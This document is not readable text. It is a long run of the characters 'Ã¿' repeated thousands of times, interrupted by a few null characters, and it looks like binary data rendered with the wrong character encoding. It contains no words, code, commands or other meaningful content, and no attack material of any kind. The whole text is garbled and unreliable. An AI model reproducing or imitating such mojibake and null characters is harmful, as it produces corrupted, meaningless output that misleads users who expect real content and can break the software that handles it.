¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿\u0000Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿\u0000Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿\u0000Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿